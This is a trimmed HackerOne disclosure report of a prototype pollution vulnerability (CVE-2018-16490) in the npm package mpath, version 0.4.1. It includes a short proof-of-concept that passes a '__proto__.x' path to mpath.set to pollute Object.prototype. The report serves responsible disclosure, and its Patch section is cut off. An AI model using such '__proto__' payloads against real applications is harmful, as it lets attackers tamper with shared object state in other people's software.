# [H] Prototype Pollution Vulnerability in mpath Package

## Summary
Severity: High (CVSS 7.6)
Program: Node.js third-party modules
Weakness: N/A
Reporter: cris_semmle
State: resolved
Disclosed: 2018-11-30T06:21:32.425Z
CVE: CVE-2018-16490
Source: https://hackerone.com/reports/390860

## Details
I would like to report prototype pollution vulnerability in mpath.
It allows an attacker to inject arbitrary properties on Object.prototype.

# Module

**module name:** mpath
**version:** 0.4.1
**npm page:** `https://www.npmjs.com/package/mpath`

## Module Description

{G,S}et javascript object values using MongoDB-like path notatio

## Module Stats

305,874 downloads in the last week

# Vulnerability

## Vulnerability Description

An attacker can specify a path that include the prototype object, and thus overwrite important properties on Object.prototype or add new ones.

## Steps To Reproduce:

```js
var mpath = require("mpath");
var obj = {
    comments: [
        { title: 'funny' },
        { title: 'exciting!' }
    ]
}
mpath.set('__proto__.x', ['hilarious', 'fruity'], obj);
console.log({}.x); 
```

## Patch

_Trimmed to 38 lines — full report: https://hackerone.com/reports/390860_
